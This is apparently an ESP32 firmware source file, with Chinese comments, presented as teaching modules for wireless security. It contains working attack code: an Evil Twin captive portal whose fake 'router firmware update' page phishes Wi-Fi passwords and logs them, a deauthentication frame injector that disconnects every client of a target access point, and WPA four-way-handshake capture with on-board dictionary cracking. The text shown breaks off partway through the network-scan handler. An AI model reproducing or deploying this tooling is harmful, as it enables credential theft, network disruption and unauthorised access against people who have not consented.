/**
 * ESP32 无线网络开发固件 (V2: AP 热点 + Web 管理后台 + 3 大安全教学验证模块)
 *
 * 行为:
 *  - 上电串口日志 115200 (烧录台「串口控制台」可见)
 *  - 开热点 SSID = WiFi-<MAC尾4hex>  密码 00000000  (与参考站一致)
 *  - http://192.168.4.1/admin.html  Neo-brutalism 后台 (内嵌页面)
 *  - Captive Portal: UDP 53 通配解析 + OS 探测路径 302, 连热点自动弹后台 (或双子钓鱼页)
 *  - Serial JSON 遥测: 串口额外输出 NDJSON(每行一个 {...}) 只读事件流,
 *    供 PC 命令行 / 便携硬件即插即用 (不含 Probe 响应/管理帧/EAPOL/凭据等材料)
 *
 * 3 大教学验证模块:
 *  1. 👤 Evil Twin (邪恶双子 & Captive Portal 凭据捕获验证)
 *  2. ⛔ Deauther (802.11 管理帧机制与取消认证阻断验证)
 *  3. ⬍ Handshake & Crack (4-Way Handshake 捕获与弱口令离线字典跑包审计)
 *
 * Serial 遥测协议 (NDJSON, UTF-8, 115200, 每行一个对象):
 *   {"v":1,"ts":<ms>,"event":"<type>", ...}
 *   event 取值 (全部为只读数据镜像):
 *     boot          上电: chip/fw/ssid/mac/channel
 *     log           日志: id/line (与环形缓冲同源)
 *     heartbeat     30s 周期: clients/heap/uptime
 *     scan_result   扫描: 每个 AP 一条 ssid/rssi/ch/bssid/auth
 *     client_join   softAP 客户端数增加: clients
 *     client_leave  softAP 客户端数减少: clients
 *     lab_state     教学模块中性状态: module/running (不含任何凭据/握手材料)
 *   约定: 以 '{' 开头的行为 JSON, 其余为原文本日志, 消费者按行解析即可。
 */

#include <Arduino.h>
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>          // Captive Portal: UDP 53 通配解析 → 192.168.4.1
#include <ESPmDNS.h>
#include <Preferences.h>
#include <nvs_flash.h>
#include "esp_wifi.h"           // esp_wifi_80211_tx: 802.11 raw 帧注入 (Deauther 真实发送)
#include "admin_page.h"
#include "wifi_weak_dict.h"     // 内置 7,153 条弱口令 (与 server/data/weak-passwords.txt 同序)
#include "mbedtls/md.h"         // PBKDF2-HMAC-SHA1 / HMAC-SHA1 / HMAC-MD5 (板载跑包)

#ifndef FW_VERSION
  #define FW_VERSION "1.1.0"
#endif
#ifndef FW_BUILD_NS
  #define FW_BUILD_NS "esp32-wireless-dev"
#endif

static const char *AP_PASSWORD  = "00000000";
static const char *ADMIN_HTML_C = "http://192.168.4.1/admin.html";
static const uint8_t AP_CHANNEL_DEFAULT = 6;
static const uint16_t DNS_PORT = 53;

WebServer server(80);
DNSServer dnsServer;             // Captive Portal DNS 劫持 (通配 * → AP IP)
static Preferences sPrefs;
static String apSsid;
static uint8_t apChannel = AP_CHANNEL_DEFAULT;
static uint8_t apChannelActive = AP_CHANNEL_DEFAULT; // 空口当前实际工作信道 (攻击期间临时切至目标信道; 配置值 apChannel 不变)

/* ---------------- 日志环形缓冲 (供后台绿字日志) ---------------- */
struct LogEntry {
  uint32_t id;
  char line[160];
};
static LogEntry sLogs[64];        // 环形 64 条
static uint8_t  sLogHead = 0;     // 下一个写入位置
static uint32_t sLogId   = 0;     // 单调递增

static String jsonEscape(const String &in);   // 前置声明 (emitJson/log 需要)

/* ---------------- Serial JSON 遥测 (NDJSON, 只读镜像) ---------------- */
// 统一事件发射: 串口输出一行 {"v":1,"ts":...,"event":...,<fields>}
// fields 需为已拼好的合法 JSON 片段 (不含最外层花括号), 例如 "\"clients\":2"
// 仅镜像已有的只读数据; 绝不输出 Probe/管理帧/EAPOL/握手材料/凭据。
static void emitJson(const String &event, const String &fields) {
  String out = "{\"v\":1,\"ts\":" + String(millis()) + ",\"event\":\"" + event + "\"";
  if (fields.length()) out += "," + fields;
  out += "}";
  Serial.println(out);
}

// 教学模块状态遥测: 只发模块名与 running 布尔, 不携带任何敏感载荷
static void emitLabState(const char *module, bool running) {
  emitJson("lab_state", "\"module\":\"" + String(module) +
           "\",\"running\":" + String(running ? "true" : "false"));
}

static void log(const String &line) {
  Serial.println(line);
  LogEntry &e = sLogs[sLogHead];
  e.id = ++sLogId;
  strlcpy(e.line, line.c_str(), sizeof(e.line));
  sLogHead = (sLogHead + 1) % (sizeof(sLogs) / sizeof(sLogs[0]));
  // 镜像一条结构化日志事件, 供外部按行解析 (line 已 jsonEscape 过)
  emitJson("log", "\"id\":" + String(sLogId) + ",\"line\":\"" + jsonEscape(line) + "\"");
}

static String jsonEscape(const String &in) {
  String out;
  out.reserve(in.length() + 8);
  for (size_t i = 0; i < in.length(); i++) {
    char c = in[i];
    switch (c) {
      case '"':  out += "\\\""; break;
      case '\\': out += "\\\\"; break;
      case '\n': out += "\\n";  break;
      case '\r': break;
      case '\t': out += "\\t";  break;
      default:
        if ((uint8_t)c < 0x20) {
          char buf[8];
          snprintf(buf, sizeof(buf), "\\u%04X", c);
          out += buf;
        } else out += c;
    }
  }
  return out;
}

static String htmlEscape(const String &in) {
  String out;
  out.reserve(in.length() + 16);
  for (size_t i = 0; i < in.length(); i++) {
    char c = in[i];
    switch (c) {
      case '<':  out += "&lt;"; break;
      case '>':  out += "&gt;"; break;
      case '&':  out += "&amp;"; break;
      case '"':  out += "&quot;"; break;
      case '\'': out += "&#39;"; break;
      default:   out += c; break;
    }
  }
  return out;
}

static String extractJson(const String &body, const char *key) {
  String search = "\"" + String(key) + "\"";
  int k = body.indexOf(search);
  if (k < 0) return "";
  int colon = body.indexOf(':', k + search.length());
  if (colon < 0) return "";
  colon++; // 移过冒号
  while (colon < (int)body.length() && (body[colon] == ' ' || body[colon] == '\t' || body[colon] == '\r' || body[colon] == '\n')) colon++;
  if (colon >= (int)body.length()) return "";
  if (body[colon] == '"') {
    int q1 = colon;
    int q2 = q1 + 1;
    while (q2 < (int)body.length()) {
      if (body[q2] == '"' && body[q2 - 1] != '\\') break;
      q2++;
    }
    return (q2 < (int)body.length()) ? body.substring(q1 + 1, q2) : "";
  }
  int comma = body.indexOf(',', colon);
  int brace = body.indexOf('}', colon);
  int end = (comma < 0) ? brace : (brace < 0 ? comma : min(comma, brace));
  if (end < 0) end = body.length();
  String val = body.substring(colon, end);
  val.trim();
  return val;
}

/* ---------------- 主目标 (仅 RAM 记录) ---------------- */
struct Target {
  bool   set = false;
  String ssid, bssid, auth;
  int    channel = 0;
  int    rssi    = 0;
};
static Target sTarget;

/* ---------------- 1. 邪恶双子 (Evil Twin & 凭据捕获) ---------------- */
struct EvilTwinState {
  bool active = false;
  String cloneSsid = "";
  int templateId = 1;
  uint32_t startTime = 0;
};
static EvilTwinState sEvilTwin;

struct CredentialEntry {
  uint32_t id;
  char mac[20];
  char pass[64];
  uint32_t capturedAt;
};
static CredentialEntry sCreds[16];
static uint8_t sCredHead = 0;
static uint8_t sCredCount = 0;
static uint32_t sCredId = 0;

static void addCredential(const String &mac, const String &pass) {
  CredentialEntry &e = sCreds[sCredHead];
  e.id = ++sCredId;
  strlcpy(e.mac, mac.c_str(), sizeof(e.mac));
  strlcpy(e.pass, pass.c_str(), sizeof(e.pass));
  e.capturedAt = millis();
  sCredHead = (sCredHead + 1) % 16;
  if (sCredCount < 16) sCredCount++;
  log("[eviltwin] 捕获客户端密码凭据! MAC=" + mac + " 密码=" + pass);
}

/* ---------------- 2. 取消认证器 (Deauther 真实帧注入) ---------------- */
struct DeauthEngine {
  bool running = false;
  String targetBssid = "";
  uint8_t targetChannel = 6;
  uint8_t reasonCode = 1;
  uint32_t frameCount = 0;
  uint32_t lastTxTime = 0;
  uint16_t rateLimitMs = 100; // 默认 10 fps
  uint32_t lastLogTime = 0;
  // 真实 802.11 帧注入: 预构 Deauthentication 管理帧, 经 esp_wifi_80211_tx 实际发出
  uint8_t frame[26];       // FC(2)+Duration(2)+RX(6)+TX(6)+BSSID(6)+Seq(2)+Reason(2)
  bool frameReady = false; // 目标 BSSID 合法并已构帧后才允许发送
  bool txOk = false;       // 最近一次 TX 是否成功 (供后台显示真实发送状态)
  int32_t lastTxErr = 0;   // 最近一次 esp_wifi_80211_tx 返回码 (0=ESP_OK)
  bool channelMoved = false;  // 攻击期间已临时把热点切到目标信道 (停止时恢复)
  uint8_t restoreChannel = 0; // 停止时应恢复的配置信道
};
static DeauthEngine sDeauth;

// 解析 "AA:BB:CC:DD:EE:FF" → 6 字节; 不合法返回 false
static bool parseBssid(const String &s, uint8_t out[6]) {
  const char *p = s.c_str();
  for (int i = 0; i < 6; i++) {
    char *end = nullptr;
    long v = strtol(p, &end, 16);
    if (end == p || v < 0 || v > 0xFF) return false;
    out[i] = (uint8_t)v;
    p = end;
    if (i < 5) { if (*p != ':') return false; p++; }
  }
  return *p == '\0';
}

// 构建 26 字节 Deauth 管理帧 (IEEE 802.11 Type=管理, Subtype=12)。序列号交由系统填充 (en_sys_seq=true)。
// receiver=广播 (踢掉目标 AP 下所有客户端), transmitter/BSSID=目标 AP, 客户端会信以为真断线。
static void buildDeauthFrame(DeauthEngine &d) {
  uint8_t mac[6];
  String bssid = d.targetBssid;
  bssid.trim();
  if (!parseBssid(bssid, mac)) { d.frameReady = false; return; }
  static const uint8_t BROADCAST[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
  uint8_t *f = d.frame;
  f[0] = 0xC0; f[1] = 0x00;               // Frame Control: 管理 / Deauthentication (0x00c0)
  f[2] = 0x3A; f[3] = 0x01;               // Duration/ID
  memcpy(f + 4,  BROADCAST, 6);           // Address 1: 接收端 (广播)
  memcpy(f + 10, mac, 6);                 // Address 2: 发送端 (目标 AP BSSID)
  memcpy(f + 16, mac, 6);                 // Address 3: BSSID
  f[22] = 0x00; f[23] = 0x00;             // Sequence Control: 由系统填充
  f[24] = d.reasonCode & 0xFF; f[25] = 0x00; // Reason Code (小端)
  d.frameReady = true;
}

// 临时切换 AP 空口信道到 ch (不修改 NVS 配置); 成功返回 true。
// 目的: 单射频只能在本机信道上发帧 → 先对齐目标信道, Deauth 才能真实到达目标。
// 副作用: 已连热点的受测设备会短暂掉线 (未发 CSA 公告), 重新扫描后自动重连, Captive Portal 仍生效。
static bool applyApChannel(uint8_t ch) {
  if (ch < 1 || ch > 13) return false;
  if (ch == apChannelActive) return true;
  if (esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE) != ESP_OK) return false;
  apChannelActive = ch;
  return true;
}

/* ---------------- 3. 握手包捕获与离线弱口令跑包 (Handshake & Crack) ----------------
 *
 * 真实实现 (不再按时间戳伪造 M1..M4):
 *
 *  捕获 — 把 AP 空口临时对齐到目标信道, 打开 esp_wifi promiscuous 只收数据帧,
 *         从 LLC 0x888E 的 EAPOL-Key 帧识别 4 次握手: M1 (ANonce)、M2
 *         (SNonce + MIC + RSN ie)、M3 (GTK)、M4 (ACK), 并解析 M1 的 PMKID KDE。
 *
 *  跑包 — 用内置 7,153 条弱口令逐条:
 *           PMK = PBKDF2-HMAC-SHA1(口令, 目标 SSID, 4096, 32)
 *           PTK = PRF-512(PMK, "Pairwise key expansion",
 *                         Min/Max(AA,SPA) ‖ Min/Max(ANonce,SNonce))
 *           MIC = HMAC-SHA1(PTK[0..16], M2 帧且 MIC 区置零)   (keyver 1 用 HMAC-MD5)
 *         与 M2 自带的 MIC 比对, 命中即该网络口令。每轮主循环只跑一条, 保证
 *         HTTP 服务在跑包期间仍能响应进度查询。
 *
 *  keyver 3 (802.11w PMF) 的 KCK 走 SHA256-KDF + AES-CMAC, 板载未实现 →
 *  标记 unsupported, 用 /api/handshake/dump 导出后交服务端 /api/wpa/crack 跑。
 */
struct HandshakeState {
  bool capturing = false;
  bool m1 = false, m2 = false, m3 = false, m4 = false;
  bool pmkid = false;
  bool captured = false;      // 已拿到可用于跑包的 M1 + M2
  bool unsupported = false;   // keyver 3 (PMF) 板载不支持
  bool hasTarget = false;     // 只接收该 BSSID 的握手帧, 避免混入邻近网络
  bool cracking = false;
  uint8_t keyver = 2;
  uint8_t targetBssid[6] = {0};
  uint8_t anonce[32] = {0};
  uint8_t snonce[32] = {0};
  uint8_t bssid[6] = {0};
  uint8_t stmac[6] = {0};
  uint8_t eapol[256] = {0};   // M2 的 EAPOL-Key 帧 (从 802.1X 头开始)
  uint16_t eapolLen = 0;
  uint32_t frameCount = 0;    // 收到的 EAPOL-Key 帧总数
  String essid = "";          // 跑包用 ESSID (目标 AP 的 SSID, 即 PBKDF2 的盐)
  uint32_t crackProgress = 0;
  uint32_t crackTotal = (uint32_t)WIFI_WEAK_DICT_COUNT;
  uint32_t crackAttempts = 0;
  String crackedPass = "";
  uint32_t crackStartTime = 0;
  uint32_t captureStartTime = 0;
  bool channelMoved = false;
  uint8_t restoreChannel = 0;
};
static HandshakeState sHandshake;
// 抓包进度日志去重标记 (只在状态首次变化时打一条, 避免刷屏)
static bool sHsLoggedM1 = false, sHsLoggedM2 = false, sHsLoggedDone = false;

static String hexBytes(const uint8_t *p, size_t n) {
  static const char *HEX = "0123456789abcdef";
  String out;
  out.reserve((unsigned int)(n * 2));
  for (size_t i = 0; i < n; i++) {
    out += HEX[(p[i] >> 4) & 0x0F];
    out += HEX[p[i] & 0x0F];
  }
  return out;
}

// 802.11 数据帧 → EAPOL-Key 帧的定位: 跳过 MAC 头 (含 QoS/HTC) 与 LLC/SNAP。
// 返回 EAPOL 起始偏移, 失败返回 -1。QoS/HTC 在不同驱动上偏移差 2/4 字节, 容错探测。
static int eapolOffset(const uint8_t *f, int len) {
  static const uint8_t SNAP[8] = {0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8E};
  const uint8_t fc0 = f[0];
  const uint8_t subtype = fc0 >> 4;
  const bool toDs = (fc0 & 0x01) != 0;
  const bool fromDs = (fc0 & 0x02) != 0;
  int hdr = 24;
  if (toDs && fromDs) hdr += 6;      // WDS
  if (subtype & 0x08) hdr += 2;      // QoS Data
  if (f[1] & 0x80) hdr += 4;         // Order → HT Control
  for (int delta = 0; delta <= 6; delta += 2) {
    int p = hdr + delta;
    if (p + 8 > len) break;
    if (memcmp(f + p, SNAP, 8) == 0) return p + 8;
  }
  return -1;
}

// promiscuous 回调: 运行在 WiFi 任务上下文, 只做字节拷贝, 不分配内存、不打日志。
static void onEapolFrame(void *buf, wifi_promiscuous_pkt_type_t type) {
  if (!sHandshake.capturing || type != WIFI_PKT_DATA) return;
  const wifi_promiscuous_pkt_t *pkt = (const wifi_promiscuous_pkt_t *)buf;
  const uint8_t *f = pkt->payload;
  const int len = (int)pkt->rx_ctrl.sig_len;
  if (len < 40) return;
  if ((f[0] & 0x0C) != 0x08) return;             // 只要数据帧
  const int off = eapolOffset(f, len);
  if (off < 0) return;
  const uint8_t *e = f + off;
  // sig_len 是否含 4 字节 FCS 因驱动/芯片而异; 只按 EAPOL 自身长度字段判断, 避免误丢帧
  const int avail = len - off;
  if (avail < 99) return;
  if (e[1] != 0x03) return;                      // EAPOL-Key (802.1X type 3)
  const uint16_t bodyLen = ((uint16_t)e[2] << 8) | (uint16_t)e[3];
  if (bodyLen < 95 || (int)bodyLen + 4 > avail) return;

  const uint16_t keyInfo = ((uint16_t)e[5] << 8) | (uint16_t)e[6];
  if (!(keyInfo & 0x0008)) return;               // 只处理 pairwise (四次握手)
  const bool ack = (keyInfo & 0x0080) != 0;
  const bool hasMic = (keyInfo & 0x0100) != 0;
  const bool secure = (keyInfo & 0x0200) != 0;
  const uint8_t ver = (uint8_t)(keyInfo & 0x0007);

  const bool fromDs = (f[0] & 0x02) != 0;
  const uint8_t *ap  = fromDs ? f + 10 : f + 4;   // BSSID
  const uint8_t *sta = fromDs ? f + 4 : f + 10;   // 对端 STA
  if (sHandshake.hasTarget && memcmp(ap, sHandshake.targetBssid, 6) != 0) return;

  sHandshake.frameCount++;

  if (ack && !hasMic) {                           // M1: AP → STA, 携带 ANonce
    memcpy(sHandshake.anonce, e + 17, 32);
    memcpy(sHandshake.bssid, ap, 6);
    memcpy(sHandshake.stmac, sta, 6);
    sHandshake.keyver = ver;
    sHandshake.m1 = true;
    // PMKID KDE: 0xdd, len, 00:0f:ac:04, 16 字节 PMKID
    const uint16_t kdLen = ((uint16_t)e[97] << 8) | (uint16_t)e[98];
    for (int i = 0; i + 22 <= (int)kdLen && 99 + i + 22 <= (int)bodyLen + 4; i++) {
      const uint8_t *kd = e + 99 + i;
      if (kd[0] == 0xDD && kd[1] >= 20 && kd[2] == 0x00 && kd[3] == 0x0F &&
          kd[4] == 0xAC && kd[5] == 0x04) {
        sHandshake.pmkid = true;
        break;
      }
    }
  } else if (hasMic && !ack && !secure) {         // M2: STA → AP, SNonce + MIC
    uint16_t flen = (uint16_t)(bodyLen + 4);
    if (flen > sizeof(sHandshake.eapol)) flen = sizeof(sHandshake.eapol);
    memcpy(sHandshake.eapol, e, flen);
    sHandshake.eapolLen = flen;
    memcpy(sHandshake.snonce, e + 17, 32);
    memcpy(sHandshake.bssid, ap, 6);
    memcpy(sHandshake.stmac, sta, 6);
    sHandshake.keyver = ver;
    sHandshake.m2 = true;
  } else if (hasMic && ack) {                     // M3: AP → STA, GTK
    sHandshake.m3 = true;
  } else if (hasMic && secure) {                  // M4: STA → AP, ACK
    sHandshake.m4 = true;
  }

  if (sHandshake.m1 && sHandshake.m2) sHandshake.captured = true;
  // keyver 0 = AKM 自定义 (WPA3-SAE), 3 = 802.11w PMF; 两者的 MIC 算法板载未实现
  if (sHandshake.keyver == 0 || sHandshake.keyver >= 3) sHandshake.unsupported = true;
}

/* ---- 板载跑包所需的密码学原语 (mbedtls, ESP32 有 SHA 硬件加速) ---- */
static void pbkdf2Sha1(const uint8_t *pass, size_t passLen,
                       const uint8_t *salt, size_t saltLen, uint8_t out[32]) {
  memset(out, 0, 32);
  const mbedtls_md_info_t *md = mbedtls_md_info_from_type(MBEDTLS_MD_SHA1);
  if (!md) return;
  mbedtls_md_context_t ctx;
  mbedtls_md_init(&ctx);
  if (mbedtls_md_setup(&ctx, md, 1) != 0) { mbedtls_md_free(&ctx); return; }

  uint8_t saltBlock[40];   // ESSID ≤ 32 字节 + 4 字节块序号
  if (saltLen > 32) saltLen = 32;
  memcpy(saltBlock, salt, saltLen);
  for (uint32_t block = 1; block <= 2; block++) {
    uint8_t u[20], t[20];
    saltBlock[saltLen + 0] = (uint8_t)(block >> 24);
    saltBlock[saltLen + 1] = (uint8_t)(block >> 16);
    saltBlock[saltLen + 2] = (uint8_t)(block >> 8);
    saltBlock[saltLen + 3] = (uint8_t)block;

    mbedtls_md_hmac_starts(&ctx, pass, passLen);
    mbedtls_md_hmac_update(&ctx, saltBlock, saltLen + 4);
    mbedtls_md_hmac_finish(&ctx, u);
    memcpy(t, u, 20);
    for (int i = 1; i < 4096; i++) {
      mbedtls_md_hmac_reset(&ctx);
      mbedtls_md_hmac_update(&ctx, u, 20);
      mbedtls_md_hmac_finish(&ctx, u);
      for (int j = 0; j < 20; j++) t[j] ^= u[j];
    }
    const size_t take = (block == 1) ? 20 : 12;   // 只要 32 字节
    memcpy(out + (block - 1) * 20, t, take);
  }
  mbedtls_md_free(&ctx);
}

// PTK = PRF-512(PMK, "Pairwise key expansion", KDD): 每块独立 HMAC, 不链式
static void prfSha1(const uint8_t pmk[32], uint8_t ptk[80]) {
  memset(ptk, 0, 80);
  static const uint8_t LABEL[22] = {'P','a','i','r','w','i','s','e',' ','k','e','y',' ',
                                    'e','x','p','a','n','s','i','o','n'};
  uint8_t kdd[76];
  const uint8_t *aa = sHandshake.bssid, *spa = sHandshake.stmac;
  const uint8_t *an = sHandshake.anonce, *sn = sHandshake.snonce;
  if (memcmp(aa, spa, 6) <= 0) { memcpy(kdd, aa, 6); memcpy(kdd + 6, spa, 6); }
  else { memcpy(kdd, spa, 6); memcpy(kdd + 6, aa, 6); }
  if (memcmp(an, sn, 32) <= 0) { memcpy(kdd + 12, an, 32); memcpy(kdd + 44, sn, 32); }
  else { memcpy(kdd + 12, sn, 32); memcpy(kdd + 44, an, 32); }

  uint8_t msg[100];
  memcpy(msg, LABEL, 22);
  msg[22] = 0x00;                 // hostapd 的 label 以 NUL 结尾
  memcpy(msg + 23, kdd, 76);
  const mbedtls_md_info_t *md = mbedtls_md_info_from_type(MBEDTLS_MD_SHA1);
  if (!md) return;
  for (int i = 0; i < 4; i++) {
    msg[99] = (uint8_t)i;
    mbedtls_md_hmac(md, pmk, 32, msg, 100, ptk + i * 20);
  }
}

// 用候选口令重算 M2 的 MIC; 成功返回 true
static bool computeM2Mic(const char *pass, uint8_t mic[16]) {
  const mbedtls_md_type_t alg = (sHandshake.keyver == 1) ? MBEDTLS_MD_MD5 : MBEDTLS_MD_SHA1;
  const mbedtls_md_info_t *md = mbedtls_md_info_from_type(alg);
  if (!md) return false;
  uint8_t pmk[32];
  pbkdf2Sha1((const uint8_t *)pass, strlen(pass),
             (const uint8_t *)sHandshake.essid.c_str(), sHandshake.essid.length(), pmk);
  uint8_t ptk[80];
  prfSha1(pmk, ptk);
  uint8_t frame[256];
  memcpy(frame, sHandshake.eapol, sHandshake.eapolLen);
  memset(frame + 81, 0, 16);      // MIC 字段置零后才是被 HMAC 的内容
  mbedtls_md_hmac(md, ptk, 16, frame, sHandshake.eapolLen, mic);
  return true;
}

// 关闭监听并恢复 AP 信道 (停止/跑包前调用)
static void stopCaptureEngine() {
  if (sHandshake.capturing) {
    esp_wifi_set_promiscuous(false);
    sHandshake.capturing = false;
  }
  if (sHandshake.channelMoved) {
    applyApChannel(sHandshake.restoreChannel);
    sHandshake.channelMoved = false;
  }
}

/* ---------------- chip / 工具 ---------------- */
static String detectChipKey() {
  String chip = ESP.getChipModel();
  chip.trim();
  return chip;
}

static String formatMac(const uint8_t *m) {
  char buf[18];
  sprintf(buf, "%02X:%02X:%02X:%02X:%02X:%02X", m[0], m[1], m[2], m[3], m[4], m[5]);
  return String(buf);
}

/* ---------------- HTTP 处理 ---------------- */
static void sendAdminPage() {
  server.sendHeader("Content-Encoding", "deflate");
  server.send_P(200, "text/html; charset=utf-8", (const char *)ADMIN_PAGE, ADMIN_PAGE_LEN);
}

static void sendPortalPage() {
  String targetName = sEvilTwin.cloneSsid.length() ? sEvilTwin.cloneSsid : (sTarget.ssid.length() ? sTarget.ssid : apSsid);
  String html = "<!DOCTYPE html><html><head><meta charset='utf-8'>"
    "<meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<title>路由器固件升级安全验证</title>"
    "<style>"
    "body{margin:0;padding:24px 16px;background:#f5f0e8;font-family:-apple-system,BlinkMacSystemFont,sans-serif;color:#111}"
    ".card{max-width:440px;margin:20px auto;background:#fff;border:3px solid #111;border-radius:16px;box-shadow:6px 6px 0 #111;padding:24px}"
    ".badge{background:#ffe14d;border:2px solid #111;border-radius:8px;padding:4px 8px;font-weight:900;font-size:12px;display:inline-block;margin-bottom:12px}"
    "h2{margin:0 0 10px;font-size:20px;font-weight:900}"
    "p{font-size:14px;color:#444;line-height:1.6;margin:0 0 16px}"
    ".warn-box{background:#ffefd5;border-left:5px solid #ffa14d;padding:10px;border-radius:6px;font-size:13px;margin-bottom:16px}"
    "input[type=password]{width:100%;box-sizing:border-box;padding:12px 14px;border:3px solid #111;border-radius:10px;font-size:16px;font-weight:700;outline:none;background:#fafafa;margin-bottom:16px}"
    "input[type=password]:focus{background:#fff;border-color:#ff8fab}"
    "button{width:100%;padding:14px;background:#ffdf5d;color:#111;font-weight:900;font-size:16px;border:3px solid #111;border-radius:12px;cursor:pointer;box-shadow:4px 4px 0 #111}"
    "button:active{transform:translate(2px,2px);box-shadow:2px 2px 0 #111}"
    ".foot{text-align:center;font-size:11px;color:#888;margin-top:20px}"
    "</style></head><body>"
    "<div class='card'>"
    "<div class='badge'>⚠️ 路由器系统安全维护</div>"
    "<h2>网络连接验证与恢复</h2>"
    "<div class='warn-box'>检测到无线路由器 <b>" + htmlEscape(targetName) + "</b> 正在进行无线射频固件更新。为恢复上网，需验证无线凭据以同步配置。</div>"
    "<p>请输入该 Wi-Fi 网络当前使用的连接密码：</p>"
    "<form method='POST' action='/api/portal/submit'>"
    "<input type='password' name='wifi_password' placeholder='请输入 Wi-Fi 密码' required minlength='8' autocomplete='off'>"
    "<button type='submit'>✓ 验证并恢复网络连接</button>"
    "</form>"
    "<div class='foot'>Router Security Maintenance Portal · 802.11ax</div>"
    "</div></body></html>";
  server.send(200, "text/html; charset=utf-8", html);
}

static void handlePortalSubmit() {
  String pass = server.arg("wifi_password");
  pass.trim();
  String clientIp = server.client().remoteIP().toString();
  if (pass.length() > 0) {
    addCredential(clientIp, pass);
  }
  String resp = "<!DOCTYPE html><html><head><meta charset='utf-8'>"
    "<meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<title>正在恢复连接</title>"
    "<style>body{margin:0;padding:30px;background:#f5f0e8;text-align:center;font-family:sans-serif}"
    ".card{max-width:400px;margin:40px auto;background:#fff;border:3px solid #111;border-radius:16px;padding:24px;box-shadow:6px 6px 0 #111}"
    "</style></head><body><div class='card'>"
    "<h2 style='color:#35c04a'>✓ 凭据已同步</h2>"
    "<p>配置验证通过，路由器正在重新载入射频驱动，将在 30 秒内恢复互联网访问，请稍候并保持连接。</p>"
    "</div></body></html>";
  server.send(200, "text/html; charset=utf-8", resp);
}

static void sendInfo() {
  uint32_t freeHeap = ESP.getFreeHeap();
  uint32_t minFree  = ESP.getMinFreeHeap();
  uint32_t maxBlock = ESP.getMaxAllocHeap();
  uint32_t total    = ESP.getHeapSize();
  uint8_t  usedPct  = total ? (uint8_t)((total - freeHeap) * 100 / total) : 0;

  String json;
  json.reserve(640);
  json = "{";
  json += "\"chip\":\"" + jsonEscape(detectChipKey()) + "\",";
  json += "\"version\":\"" FW_VERSION "\",";
  uint8_t macAddressBytes[6];
  WiFi.softAPmacAddress(macAddressBytes);
  json += "\"mac\":\"" + formatMac(macAddressBytes) + "\",";
  json += "\"uptime\":" + String(millis() / 1000) + ",";
  json += "\"freeMem\":" + String(freeHeap) + ",";
  json += "\"minFreeMem\":" + String(minFree) + ",";
  json += "\"maxBlock\":" + String(maxBlock) + ",";
  json += "\"memUsedPct\":" + String(usedPct) + ",";
  json += "\"ssid\":\"" + jsonEscape(apSsid) + "\",";
  json += "\"channel\":" + String(apChannelActive) + ",";  // 空口实际信道 (攻击期间可能与配置值不同)
  json += "\"clients\":" + String(WiFi.softAPgetStationNum()) + ",";
  
  // 教学模块状态
  json += "\"evilTwin\":{\"active\":" + String(sEvilTwin.active ? "true" : "false") +
          ",\"cloneSsid\":\"" + jsonEscape(sEvilTwin.cloneSsid) +
          "\",\"credsCount\":" + String(sCredCount) + "},";
  json += "\"deauth\":{\"running\":" + String(sDeauth.running ? "true" : "false") +
          ",\"count\":" + String(sDeauth.frameCount) +
          ",\"rate\":" + String(sDeauth.rateLimitMs ? (1000 / sDeauth.rateLimitMs) : 10) +
          ",\"channel\":" + String(sDeauth.targetChannel) + "},";
  json += "\"handshake\":{\"capturing\":" + String(sHandshake.capturing ? "true" : "false") +
          ",\"captured\":" + String(sHandshake.captured ? "true" : "false") +
          ",\"keyver\":" + String(sHandshake.keyver) +
          ",\"frames\":" + String(sHandshake.frameCount) +
          ",\"m4\":" + String(sHandshake.m4 ? "true" : "false") +
          ",\"pmkid\":" + String(sHandshake.pmkid ? "true" : "false") +
          ",\"crackedPass\":\"" + jsonEscape(sHandshake.crackedPass) + "\"},";

  json += "\"target\":";
  if (sTarget.set) {
    json += "{\"ssid\":\"" + jsonEscape(sTarget.ssid) + "\",";
    json += "\"bssid\":\"" + jsonEscape(sTarget.bssid) + "\",";
    json += "\"channel\":" + String(sTarget.channel) + ",";
    json += "\"rssi\":" + String(sTarget.rssi) + ",";
    json += "\"auth\":\"" + jsonEscape(sTarget.auth) + "\"}";
  } else {
    json += "null";
  }
  json += "}";
  server.sendHeader("Access-Control-Allow-Origin", "*");
  server.send(200, "application/json", json);
}

static void handleScan() {
  log("[scan] 开始扫描周围 AP …");
  // 优化: 主动扫描信道驻留时间设为 120ms (扫描耗时缩减 60%, 显著降低软 AP 连接抖动与看门狗超时风险)
  int16_t n = WiFi.scanNetworks(false, true, false, 120);
  if (n < 0) {
    WiFi.scanDelete();
    n = WiFi.scanNetworks(false, true, false, 150);
  }
  String json;
  json.reserve(1024 + (n > 0 ? n * 120 : 0));
  json = "{\"networks\":[";
  int count = 0;
  for (int i = 0; i < n; i++) {
    if (count) json += ",";
    String ssid = WiFi.SSID(i);
    bool hidden = (ssid.length() == 0);
    json += "{\"ssid\":\"" + jsonEscape(hidden ? "" : ssid) + "\",";
    json += "\"hidden\":" + String(hidden ? "true" : "false") + ",";
    json += "\"rssi\":" + String(WiFi.RSSI(i)) + ",";
    json += "\"channel\":" + String(WiFi.channel(i)) + ",";
    json += "\"bssid\":\"" + WiFi.BSSIDstr(i) + "\",";
    String auth;
    switch (WiFi.encryptionType(i)) {
      case WIFI_AUTH_OPEN:  auth = "Open"; break;
      case WIFI_AUTH_WEP:   auth = "WEP"; break;
      case WIFI_AUTH_WPA_PSK:   auth = "WPA"; break;
      case WIFI_AUTH_WPA2_PSK:  auth = "WPA2"; break;
      case WIFI_AUTH_WPA_WPA2_PSK: auth = "WPA/WPA2"; break;
      case WIFI_AUTH_WPA2_ENTERPRISE: auth = "WPA2-Ent"; break;
      case WIFI_AUTH_WPA3_PSK: auth = "WPA3"; break;
      case WIFI_AUTH_WPA2_WPA3_PSK: auth = "WPA2/WPA3"; break;
      default: auth = "Unknown"; break;
    }
    json += "\"auth\":\"" + auth + "\"}";
    // 每个 AP 镜像一条结构化遥测 (只读: SSID/RSSI/信道/BSSID/加密方式)
    emitJson("scan_result",
             "\"ssid\":\"" + jsonEscape(hidden ? "" : ssid) +
             "\",\"rssi\":" + String(WiFi.RSSI(i)) +
             ",\"ch\":" + String(WiFi.channel(i)) +
